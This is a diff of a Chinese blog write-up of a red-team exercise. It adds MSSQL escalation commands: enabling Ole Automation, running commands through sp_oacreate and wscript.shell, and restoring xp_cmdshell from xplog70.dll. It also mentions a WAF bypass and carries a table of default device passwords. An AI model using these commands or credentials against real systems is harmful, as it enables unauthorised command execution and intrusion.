@@ -637,7 +637,28 @@
 <p>有一个平台可以进行对session的替换，绕过进入后台，不过这个后台可用的功能点比较少，发现员工一些数据</p>
 <p>此外这个可以根据显示的依赖，jdbc反序列化RCE也是可以值得一试</p>
 <h3 id="3、Spring-Cloud-rce"><a href="#3、Spring-Cloud-rce" class="headerlink" title="#3、Spring Cloud rce"></a>#3、Spring Cloud rce</h3><p>一个二级单位的RCE，当时用的时候还是有点惊讶，一度怀疑是个交互式蜜罐（bushi），因为这种危险级别的漏洞一般会在日常期间会加固，可能是资产面比较宽，且搜索的方法做了很多限制和fuzz，找到了这么一个平台，也是毫无疑问getshell</p>
-<h3 id="4、SQL注入"><a href="#4、SQL注入" class="headerlink" title="#4、SQL注入"></a>#4、SQL注入</h3><p>在某粮单位有个springblade的框架服务，但是似乎不是nday（当时没找到可用的poc），根据挖掘是挖到了一个sql注入。不过利用过程中还是遇到了waf，用了%0a和&#x2F;**&#x2F;可以正常的绕过，拿到数据，可惜不是root权限不能，security_priv也没有，尽管报错时返回了绝对路径也写不到shell，告一段落</p>
+<h3 id="4、SQL注入"><a href="#4、SQL注入" class="headerlink" title="#4、SQL注入"></a>#4、SQL注入</h3><p>在某粮单位有个springblade的框架服务，但是似乎不是nday（当时没找到可用的poc），根据挖掘是挖到了一个sql注入。不过利用过程中还是遇到了waf，用了%0a和&#x2F;**&#x2F;可以正常的绕过，拿到数据，可惜不是root权限不能，security_priv也没有，尽管报错时返回了绝对路径也写不到shell，告一段落。其中有个漏洞是mssql，开始打算是用xp_cmdshell，没想到是各种踩坑。后来也是顺道学习了mssql提权的各种姿势，比如sp_oacreate函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;  </span><br><span class="line">RECONFIGURE WITH OVERRIDE;  </span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 1;  </span><br><span class="line">RECONFIGURE WITH OVERRIDE;  </span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 0;</span><br></pre></td></tr></table></figure>
+
+<p>sp_oacreate是一个非常危险的存储过程可以删除、复制、移动文件 还能配合sp_oamethod 来写文件执行cmd</p>
+<p>查看sp_oacreate状态</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from master.dbo.sysobjects where xtype=&#x27;x&#x27; and name=&#x27;SP_OACREATE&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>开启存储过程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">exec sp_configure &#x27;Ole Automation Procedures&#x27;,1;</span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure>
+
+<p>执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;whoami&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>如果xp_cmdshell被删除可以上传xplog70.dll进行恢复删除的xp_cmdshell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exec master.dbo.sp_addextendedproc &#x27;xp_cmdshell&#x27;,&#x27;D:\\xplog70.dll&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#x27;whoami&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>当时这个只能使用xp_dirtree来简单查看当前文件，不能看里面内容，只能说，水平还有待提高</p>
+<p>mssql系列文章放一个，以后有空可以多看两眼</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/st3pby/article/details/128492244">https://blog.csdn.net/st3pby/article/details/128492244</a></p>
 <h3 id="5、弱口令"><a href="#5、弱口令" class="headerlink" title="#5、弱口令"></a>#5、弱口令</h3><p>每次HW都离不开弱口令，弱口令yyds，每次都有单位因为弱口令被打进去后台，好几个即使没拿到shell，也好说歹说拿到一堆数据，拿到一点数据分。说到弱口令，我这放出一个安全设备常见的弱口令，一般还是配合指纹来进行识别爆破。</p>
 <table>
 <thead>
@@ -1375,7 +1396,7 @@
 <tr>
 <td>华为无线局域网</td>
 <td>admin</td>
-<td><a href="mailto:&#97;&#100;&#x6d;&#x69;&#110;&#x40;&#104;&#117;&#97;&#119;&#x65;&#105;&#46;&#x63;&#111;&#x6d;">&#97;&#100;&#x6d;&#x69;&#110;&#x40;&#104;&#117;&#97;&#119;&#x65;&#105;&#46;&#x63;&#111;&#x6d;</a></td>
+<td><a href="mailto:&#x61;&#100;&#109;&#105;&#x6e;&#64;&#x68;&#x75;&#x61;&#x77;&#x65;&#x69;&#x2e;&#99;&#111;&#109;">&#x61;&#100;&#109;&#105;&#x6e;&#64;&#x68;&#x75;&#x61;&#x77;&#x65;&#x69;&#x2e;&#99;&#111;&#109;</a></td>
 </tr>
 <tr>
 <td>华为网络管理(eSight Network)</td>
@@ -1725,11 +1746,11 @@
 <tr>
 <td>华为交换机(CloudEngine)</td>
 <td>-</td>
-<td><a href="mailto:&#x41;&#100;&#x6d;&#105;&#x6e;&#x40;&#x68;&#x75;&#x61;&#x77;&#x65;&#x69;&#x2e;&#99;&#111;&#x6d;">&#x41;&#100;&#x6d;&#105;&#x6e;&#x40;&#x68;&#x75;&#x61;&#x77;&#x65;&#x69;&#x2e;&#99;&#111;&#x6d;</a></td>
+<td><a href="mailto:&#65;&#x64;&#109;&#105;&#110;&#64;&#x68;&#x75;&#x61;&#x77;&#x65;&#105;&#46;&#99;&#111;&#x6d;">&#65;&#x64;&#109;&#105;&#110;&#64;&#x68;&#x75;&#x61;&#x77;&#x65;&#105;&#46;&#99;&#111;&#x6d;</a></td>
 </tr>
 <tr>
 <td>admin</td>
-<td><a href="mailto:&#x61;&#100;&#109;&#x69;&#110;&#64;&#x68;&#117;&#x61;&#x77;&#101;&#105;&#x2e;&#99;&#x6f;&#x6d;">&#x61;&#100;&#109;&#x69;&#110;&#64;&#x68;&#117;&#x61;&#x77;&#101;&#105;&#x2e;&#99;&#x6f;&#x6d;</a></td>
+<td><a href="mailto:&#x61;&#x64;&#x6d;&#x69;&#110;&#x40;&#x68;&#x75;&#97;&#119;&#x65;&#105;&#x2e;&#x63;&#x6f;&#x6d;">&#x61;&#x64;&#x6d;&#x69;&#110;&#x40;&#x68;&#x75;&#97;&#119;&#x65;&#105;&#x2e;&#x63;&#x6f;&#x6d;</a></td>
 <td></td>
 </tr>
 <tr>
@@ -1744,7 +1765,7 @@
 </tr>
 <tr>
 <td>-</td>
-<td><a href="mailto:&#65;&#100;&#x6d;&#105;&#x6e;&#x40;&#104;&#117;&#97;&#119;&#x65;&#x69;&#46;&#99;&#x6f;&#109;">&#65;&#100;&#x6d;&#105;&#x6e;&#x40;&#104;&#117;&#97;&#119;&#x65;&#x69;&#46;&#99;&#x6f;&#109;</a></td>
+<td><a href="mailto:&#65;&#100;&#109;&#105;&#x6e;&#x40;&#104;&#117;&#x61;&#x77;&#101;&#105;&#x2e;&#x63;&#x6f;&#x6d;">&#65;&#100;&#109;&#105;&#x6e;&#x40;&#104;&#117;&#x61;&#x77;&#101;&#105;&#x2e;&#x63;&#x6f;&#x6d;</a></td>
 <td></td>
 </tr>
 <tr>
@@ -2014,12 +2035,12 @@
 </tr>
 <tr>
 <td>admin</td>
-<td><a href="mailto:&#x61;&#x64;&#x6d;&#105;&#110;&#64;&#x68;&#x75;&#x61;&#x77;&#x65;&#105;&#x2e;&#99;&#x6f;&#x6d;">&#x61;&#x64;&#x6d;&#105;&#110;&#64;&#x68;&#x75;&#x61;&#x77;&#x65;&#105;&#x2e;&#99;&#x6f;&#x6d;</a></td>
+<td><a href="mailto:&#x61;&#100;&#x6d;&#x69;&#x6e;&#64;&#x68;&#x75;&#x61;&#119;&#101;&#x69;&#x2e;&#99;&#x6f;&#x6d;">&#x61;&#100;&#x6d;&#x69;&#x6e;&#64;&#x68;&#x75;&#x61;&#119;&#101;&#x69;&#x2e;&#99;&#x6f;&#x6d;</a></td>
 <td></td>
 </tr>
 <tr>
 <td>admin</td>
-<td><a href="mailto:&#65;&#x64;&#x6d;&#x69;&#110;&#x40;&#x68;&#117;&#97;&#119;&#x65;&#x69;&#x2e;&#99;&#111;&#x6d;">&#65;&#x64;&#x6d;&#x69;&#110;&#x40;&#x68;&#117;&#97;&#119;&#x65;&#x69;&#x2e;&#99;&#111;&#x6d;</a></td>
+<td><a href="mailto:&#x41;&#100;&#x6d;&#105;&#110;&#64;&#x68;&#x75;&#x61;&#119;&#x65;&#105;&#x2e;&#x63;&#x6f;&#109;">&#x41;&#100;&#x6d;&#105;&#110;&#64;&#x68;&#x75;&#x61;&#119;&#x65;&#105;&#x2e;&#x63;&#x6f;&#109;</a></td>
 <td></td>
 </tr>
 <tr>
@@ -3659,7 +3680,7 @@
 </tr>
 <tr>
 <td>Teleopti WFM</td>
-<td><a href="mailto:&#97;&#100;&#109;&#105;&#x6e;&#x40;&#99;&#111;&#109;&#112;&#x61;&#110;&#x79;&#x2e;&#99;&#111;&#x6d;">&#97;&#100;&#109;&#105;&#x6e;&#x40;&#99;&#111;&#109;&#112;&#x61;&#110;&#x79;&#x2e;&#99;&#111;&#x6d;</a></td>
+<td><a href="mailto:&#97;&#100;&#x6d;&#x69;&#110;&#64;&#99;&#111;&#109;&#x70;&#x61;&#x6e;&#x79;&#46;&#99;&#x6f;&#x6d;">&#97;&#100;&#x6d;&#x69;&#110;&#64;&#99;&#111;&#109;&#x70;&#x61;&#x6e;&#x79;&#46;&#99;&#x6f;&#x6d;</a></td>
 <td>admin</td>
 </tr>
 <tr>
@@ -3934,7 +3955,7 @@
 </tr>
 <tr>
 <td>walle Devops代码部署平台</td>
-<td><a href="mailto:&#x73;&#117;&#x70;&#x65;&#x72;&#64;&#119;&#x61;&#x6c;&#x6c;&#x65;&#45;&#x77;&#x65;&#x62;&#x2e;&#105;&#x6f;">&#x73;&#117;&#x70;&#x65;&#x72;&#64;&#119;&#x61;&#x6c;&#x6c;&#x65;&#45;&#x77;&#x65;&#x62;&#x2e;&#105;&#x6f;</a> <a href="mailto:&#111;&#119;&#110;&#101;&#x72;&#x40;&#x77;&#97;&#108;&#108;&#101;&#45;&#119;&#x65;&#x62;&#46;&#x69;&#111;">&#111;&#119;&#110;&#101;&#x72;&#x40;&#x77;&#97;&#108;&#108;&#101;&#45;&#119;&#x65;&#x62;&#46;&#x69;&#111;</a> <a href="mailto:&#x6d;&#97;&#x73;&#x74;&#101;&#x72;&#x40;&#x77;&#97;&#x6c;&#x6c;&#101;&#45;&#119;&#101;&#x62;&#x2e;&#x69;&#111;">&#x6d;&#97;&#x73;&#x74;&#101;&#x72;&#x40;&#x77;&#97;&#x6c;&#x6c;&#101;&#45;&#119;&#101;&#x62;&#x2e;&#x69;&#111;</a> <a href="mailto:&#x64;&#x65;&#x76;&#101;&#x6c;&#111;&#x70;&#x65;&#114;&#x40;&#x77;&#97;&#x6c;&#x6c;&#101;&#x2d;&#119;&#x65;&#98;&#x2e;&#x69;&#111;">&#x64;&#x65;&#x76;&#101;&#x6c;&#111;&#x70;&#x65;&#114;&#x40;&#x77;&#97;&#x6c;&#x6c;&#101;&#x2d;&#119;&#x65;&#98;&#x2e;&#x69;&#111;</a> <a href="mailto:&#114;&#101;&#x70;&#x6f;&#x72;&#x74;&#101;&#114;&#64;&#x77;&#x61;&#108;&#108;&#101;&#45;&#x77;&#x65;&#x62;&#46;&#105;&#x6f;">&#114;&#101;&#x70;&#x6f;&#x72;&#x74;&#101;&#114;&#64;&#x77;&#x61;&#108;&#108;&#101;&#45;&#x77;&#x65;&#x62;&#46;&#105;&#x6f;</a></td>
+<td><a href="mailto:&#115;&#x75;&#x70;&#101;&#x72;&#x40;&#119;&#97;&#108;&#108;&#101;&#45;&#119;&#101;&#x62;&#46;&#x69;&#x6f;">&#115;&#x75;&#x70;&#101;&#x72;&#x40;&#119;&#97;&#108;&#108;&#101;&#45;&#119;&#101;&#x62;&#46;&#x69;&#x6f;</a> <a href="mailto:&#x6f;&#119;&#110;&#101;&#114;&#64;&#x77;&#x61;&#108;&#108;&#101;&#x2d;&#119;&#x65;&#x62;&#46;&#x69;&#111;">&#x6f;&#119;&#110;&#101;&#114;&#64;&#x77;&#x61;&#108;&#108;&#101;&#x2d;&#119;&#x65;&#x62;&#46;&#x69;&#111;</a> <a href="mailto:&#109;&#97;&#x73;&#116;&#x65;&#x72;&#x40;&#119;&#97;&#x6c;&#108;&#x65;&#x2d;&#x77;&#101;&#x62;&#x2e;&#105;&#111;">&#109;&#97;&#x73;&#116;&#x65;&#x72;&#x40;&#119;&#97;&#x6c;&#108;&#x65;&#x2d;&#x77;&#101;&#x62;&#x2e;&#105;&#111;</a> <a href="mailto:&#100;&#101;&#x76;&#x65;&#x6c;&#111;&#x70;&#x65;&#114;&#64;&#x77;&#97;&#108;&#108;&#101;&#45;&#x77;&#x65;&#x62;&#x2e;&#x69;&#x6f;">&#100;&#101;&#x76;&#x65;&#x6c;&#111;&#x70;&#x65;&#114;&#64;&#x77;&#97;&#108;&#108;&#101;&#45;&#x77;&#x65;&#x62;&#x2e;&#x69;&#x6f;</a> <a href="mailto:&#x72;&#101;&#x70;&#111;&#114;&#x74;&#101;&#114;&#64;&#119;&#97;&#x6c;&#108;&#x65;&#45;&#x77;&#x65;&#98;&#46;&#x69;&#111;">&#x72;&#101;&#x70;&#111;&#114;&#x74;&#101;&#114;&#64;&#119;&#97;&#x6c;&#108;&#x65;&#45;&#x77;&#x65;&#98;&#46;&#x69;&#111;</a></td>
 <td>Walle123</td>
 </tr>
 <tr>
